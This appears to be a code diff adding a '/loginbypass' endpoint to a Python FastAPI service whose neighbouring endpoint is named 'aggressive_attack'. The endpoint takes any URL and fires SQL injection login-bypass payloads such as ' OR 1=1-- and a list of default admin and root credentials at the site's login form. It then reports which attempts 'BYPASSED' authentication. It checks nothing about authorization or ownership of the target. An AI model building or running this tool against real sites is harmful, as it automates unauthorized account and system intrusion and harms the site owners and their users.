@@ -1411,3 +1411,88 @@ def aggressive_attack(domain: str, key: str = Depends(verify_key)):
         "ai_analysis": ai_analysis,
         "response_time": f"{round(time.time()-start, 2)}s"
     }
+
+@app.get("/loginbypass")
+def login_bypass(url: str, key: str = Depends(verify_key)):
+    import urllib.request, urllib.parse, urllib.error
+    start = time.time()
+    if not url.startswith("http"):
+        url = "https://" + url
+    
+    results = []
+    
+    # 1. SQL Injection login bypass
+    sql_payloads = [
+        {"user": "' OR 1=1--", "pass": "anything"},
+        {"user": "admin'--", "pass": "anything"},
+        {"user": "' OR 'x'='x", "pass": "' OR 'x'='x"},
+        {"user": "admin' #", "pass": "anything"},
+        {"user": "') OR ('1'='1", "pass": "anything"},
+    ]
+    
+    for payload in sql_payloads:
+        try:
+            data = urllib.parse.urlencode({
+                "username": payload["user"],
+                "password": payload["pass"],
+                "user": payload["user"],
+                "pass": payload["pass"],
+                "email": payload["user"]
+            }).encode()
+            req = urllib.request.Request(url, data=data, headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"})
+            res = urllib.request.urlopen(req, timeout=5)
+            body = res.read(3000).decode("utf-8", errors="ignore").lower()
+            success_signs = ["welcome", "dashboard", "logout", "profile", "account", "success", "logged in"]
+            fail_signs = ["invalid", "wrong", "incorrect", "failed", "error"]
+            if any(s in body for s in success_signs) and not any(f in body for f in fail_signs):
+                results.append({"type": "SQL Injection", "payload": payload["user"], "status": "BYPASSED!", "severity": "CRITICAL"})
+            else:
+                results.append({"type": "SQL Injection", "payload": payload["user"][:30], "status": "Failed"})
+        except Exception as e:
+            results.append({"type": "SQL Injection", "payload": payload["user"][:30], "status": f"Error: {str(e)[:50]}"})
+    
+    # 2. Default credentials
+    default_creds = [
+        {"user": "admin", "pass": "admin"},
+        {"user": "admin", "pass": "password"},
+        {"user": "admin", "pass": "123456"},
+        {"user": "admin", "pass": "admin123"},
+        {"user": "root", "pass": "root"},
+        {"user": "test", "pass": "test"},
+        {"user": "guest", "pass": "guest"},
+        {"user": "user", "pass": "user"},
+        {"user": "administrator", "pass": "administrator"},
+        {"user": "admin", "pass": ""},
+    ]
+    
+    for cred in default_creds:
+        try:
+            data = urllib.parse.urlencode({
+                "username": cred["user"],
+                "password": cred["pass"],
+                "user": cred["user"],
+                "pass": cred["pass"],
+                "email": cred["user"]
+            }).encode()
+            req = urllib.request.Request(url, data=data, headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"})
+            res = urllib.request.urlopen(req, timeout=5)
+            body = res.read(3000).decode("utf-8", errors="ignore").lower()
+            success_signs = ["welcome", "dashboard", "logout", "profile", "account", "success", "logged in"]
+            fail_signs = ["invalid", "wrong", "incorrect", "failed", "error"]
+            if any(s in body for s in success_signs) and not any(f in body for f in fail_signs):
+                results.append({"type": "Default Creds", "username": cred["user"], "password": cred["pass"], "status": "BYPASSED!", "severity": "CRITICAL"})
+            else:
+                results.append({"type": "Default Creds", "username": cred["user"], "password": cred["pass"], "status": "Failed"})
+        except Exception as e:
+            results.append({"type": "Default Creds", "username": cred["user"], "status": f"Error: {str(e)[:40]}"})
+    
+    bypassed = [r for r in results if "BYPASSED" in r["status"]]
+    return {
+        "url": url,
+        "total_tests": len(results),
+        "bypassed_count": len(bypassed),
+        "bypassed": bypassed,
+        "all_results": results,
+        "verdict": "VULNERABLE! Login can be bypassed!" if bypassed else "Safe - No bypass found",
+        "response_time": f"{round(time.time()-start, 2)}s"
+    }
